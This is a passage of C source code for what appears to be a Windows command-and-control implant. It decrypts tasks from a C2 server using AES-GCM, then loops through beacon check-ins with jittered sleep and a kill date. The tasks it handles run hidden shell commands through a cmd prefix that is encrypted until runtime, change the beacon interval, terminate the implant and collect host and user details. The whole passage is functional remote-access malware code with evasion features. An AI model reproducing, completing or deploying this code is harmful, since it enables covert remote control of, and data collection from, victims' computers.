    PCHAR pDataStart2 = strstr((PCHAR)pResponse, "\"data\":\"");
    if (!pDataStart2) { HeapFree(GetProcessHeap(), 0, pResponse); *ppTasks = NULL; *pdwTaskCount = 0; return TRUE; }
    pDataStart2 += 8;

    PCHAR pDataEnd2 = strchr(pDataStart2, '"');
    if (!pDataEnd2) { HeapFree(GetProcessHeap(), 0, pResponse); *ppTasks = NULL; *pdwTaskCount = 0; return TRUE; }

    DWORD dwB64Len2 = (DWORD)(pDataEnd2 - pDataStart2);
    BYTE bEnvBuf2[8192] = { 0 };
    DWORD dwEnvLen2 = Base64Decode(pDataStart2, dwB64Len2, bEnvBuf2, sizeof(bEnvBuf2));
    HeapFree(GetProcessHeap(), 0, pResponse);

    if (dwEnvLen2 < 14) { *ppTasks = NULL; *pdwTaskCount = 0; return TRUE; }

    // Parse envelope
    DWORD dwPayloadLen2 = (bEnvBuf2[10] << 24) | (bEnvBuf2[11] << 16) | (bEnvBuf2[12] << 8) | bEnvBuf2[13];
    if (14 + dwPayloadLen2 > dwEnvLen2) { *ppTasks = NULL; *pdwTaskCount = 0; return TRUE; }

    // AES-GCM decrypt
    PBYTE pDecrypted2 = NULL;
    DWORD dwDecryptedLen2 = 0;
    if (!AesGcmDecrypt(pSession->bSessionKey, bEnvBuf2 + 14, dwPayloadLen2, &pDecrypted2, &dwDecryptedLen2)) {
        *ppTasks = NULL;
        *pdwTaskCount = 0;
        return TRUE;
    }

    // Parse msgpack CheckInResponse → tasks array
    C2_TASK taskBuf[16] = { 0 }; // Max 16 tasks per check-in
    DWORD dwParsedTasks = 0;
    MsgpackParseCheckInResponse(pDecrypted2, dwDecryptedLen2, taskBuf, 16, &dwParsedTasks);
    HeapFree(GetProcessHeap(), 0, pDecrypted2);

    if (dwParsedTasks > 0) {
        *ppTasks = (PC2_TASK)HeapAlloc(GetProcessHeap(), 0, sizeof(C2_TASK) * dwParsedTasks);
        memcpy(*ppTasks, taskBuf, sizeof(C2_TASK) * dwParsedTasks);
    } else {
        *ppTasks = NULL;
    }
    *pdwTaskCount = dwParsedTasks;

    return TRUE;
}

// =============================================
// TransportCleanup
// =============================================
VOID TransportCleanup(VOID) {
    if (g_hConnect) WinHttpCloseHandle(g_hConnect);
    if (g_hSession) WinHttpCloseHandle(g_hSession);
    g_hConnect = NULL;
    g_hSession = NULL;
}

// =============================================
// Sleep with jitter
// =============================================
static VOID SleepWithJitter(DWORD dwSleepMs, DWORD dwJitterPct) {
    if (dwJitterPct > 0) {
        DWORD dwJitter = (dwSleepMs * dwJitterPct) / 100;
        DWORD dwMin = dwSleepMs - dwJitter;
        DWORD dwMax = dwSleepMs + dwJitter;
        dwSleepMs = dwMin + (GetTickCount() % (dwMax - dwMin + 1));
    }
    Sleep(dwSleepMs);
}

// =============================================
// ImplantMain - Main agent loop
// =============================================
VOID ImplantMain(PIMPLANT_CONFIG pConfig) {

    SESSION session = { 0 };

    // Initialize transport
    if (!TransportInit(pConfig))
        return;

    // Register with C2
    if (!TransportRegister(&session)) {
        TransportCleanup();
        return;
    }

    // Main loop: check in → get tasks → execute → report results
    while (TRUE) {

        // Check kill date
        if (pConfig->szKillDate[0] != '\0') {
            // Simple date check — compare YYYYMMDD
            SYSTEMTIME st;
            GetSystemTime(&st);
            CHAR szNow[16];
            sprintf(szNow, "%04d-%02d-%02d", st.wYear, st.wMonth, st.wDay);
            if (strcmp(szNow, pConfig->szKillDate) > 0) {
                break; // Kill date passed, exit
            }
        }

        // Check in
        PC2_TASK pTasks = NULL;
        DWORD dwTaskCount = 0;
        if (TransportCheckIn(&session, NULL, 0, &pTasks, &dwTaskCount)) {

            // Execute tasks and collect results
            C2_RESULT results[16] = { 0 };
            DWORD dwResultCount = 0;

            for (DWORD i = 0; i < dwTaskCount && i < 16; i++) {
                C2_RESULT* res = &results[dwResultCount];
                strcpy(res->szTaskID, pTasks[i].szTaskID);
                strcpy(res->szAgentID, session.szAgentID);

                switch (pTasks[i].bType) {
                    case TASK_SHELL: {
                        // Execute shell command (cmd prefix decrypted at runtime)
                        if (pTasks[i].dwArgCount > 0) {
                            CHAR szPrefix[16]; memcpy(szPrefix, g_EncCmdExe, ENC_CMD_EXE_LEN + 1);
                            DecryptString(szPrefix, ENC_CMD_EXE_LEN);
                            CHAR szCmd[1024];
                            sprintf(szCmd, "%s%s", szPrefix, pTasks[i].szArgs[0]);
                            ZeroString(szPrefix, ENC_CMD_EXE_LEN);

                            // Create pipe for output capture
                            HANDLE hReadPipe, hWritePipe;
                            SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
                            if (CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
                                STARTUPINFOA si = { .cb = sizeof(STARTUPINFOA),
                                    .dwFlags = STARTF_USESTDHANDLES,
                                    .hStdOutput = hWritePipe, .hStdError = hWritePipe };
                                PROCESS_INFORMATION pi = { 0 };

                                if (CreateProcessA(NULL, szCmd, NULL, NULL, TRUE,
                                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                                    CloseHandle(hWritePipe);
                                    WaitForSingleObject(pi.hProcess, 30000);

                                    // Read output
                                    BYTE outBuf[4096] = { 0 };
                                    DWORD dwRead = 0;
                                    ReadFile(hReadPipe, outBuf, sizeof(outBuf) - 1, &dwRead, NULL);

                                    res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwRead + 1);
                                    memcpy(res->pOutput, outBuf, dwRead);
                                    res->dwOutputLen = dwRead;

                                    CloseHandle(pi.hProcess);
                                    CloseHandle(pi.hThread);
                                } else {
                                    CloseHandle(hWritePipe);
                                    strcpy(res->szError, "CreateProcess failed");
                                }
                                CloseHandle(hReadPipe);
                            }
                        }
                        dwResultCount++;
                        break;
                    }
                    case TASK_SLEEP:
                        if (pTasks[i].dwArgCount > 0) {
                            session.dwSleepMs = (DWORD)(atoi(pTasks[i].szArgs[0]) * 1000);
                        }
                        res->pOutput = (PBYTE)"ok";
                        res->dwOutputLen = 2;
                        dwResultCount++;
                        break;
                    case TASK_KILL:
                        TransportCleanup();
                        return;
                    case TASK_SYSINFO: {
                        CHAR szInfo[1024];
                        CHAR szH[256] = {0}, szU[256] = {0}, szO[32] = {0};
                        CHAR szA[16] = {0}, szP[MAX_PATH] = {0}, szI[64] = {0};
                        DWORD pid = 0;
                        CollectSysInfo(szH, szU, szO, szA, &pid, szP, szI);
                        DWORD len = (DWORD)sprintf(szInfo, "%s\n%s\n%s\n%s\n%lu\n%s\n%s",
                            szH, szU, szO, szA, pid, szP, szI);
                        res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, len + 1);
                        memcpy(res->pOutput, szInfo, len);
                        res->dwOutputLen = len;
                        dwResultCount++;
                        break;
                    }
                    default:
                        sprintf(res->szError, "unsupported task type: %d", pTasks[i].bType);
                        dwResultCount++;
                        break;
                }
            }

            if (pTasks)
                HeapFree(GetProcessHeap(), 0, pTasks);
        }

        // Sleep with jitter
        SleepWithJitter(session.dwSleepMs, session.dwJitterPct);
    }

    TransportCleanup();
}
